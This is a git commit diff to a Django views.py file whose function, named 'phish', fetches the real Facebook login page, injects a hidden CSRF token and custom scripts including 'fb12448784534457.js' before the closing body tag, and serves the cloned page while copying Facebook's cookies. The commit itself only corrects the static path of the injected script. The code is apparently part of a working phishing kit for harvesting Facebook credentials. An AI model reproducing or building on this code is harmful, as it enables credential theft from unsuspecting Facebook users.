970f422a2d36c40a83e7f0a0e7c02f0b9432dc5e
Sifat-16 <59054820+Sifat-16@users.noreply.github.com>
2020-07-06 06:50:12 +0600

    Update views.py
    Updated a little mistake

--- shuvro/views.py
+++ shuvro/views.py
@@ -19,7 +19,7 @@ def phish(request):
 		csrf_c=csrf.get_token(request)
 		request.META['CSRF_COOKIE'] = csrf_c
 	req=requests.get("https://en-gb.facebook.com")
-	text=req.text.replace('</body>','<span id="csrf" hidden>'+str(csrf_c)+'</span><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script><script src="/static/jquery.cookie.js"></script><script src="{% static 'fb12448784534457.js' %}"></script></body>')
+	text=req.text.replace('</body>','<span id="csrf" hidden>'+str(csrf_c)+'</span><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script><script src="/static/jquery.cookie.js"></script><script src="/static/fb12448784534457.js"></script></body>')
 	response=HttpResponse(text)
 	for c in req.cookies:
 		request.META[c.name]=c.value
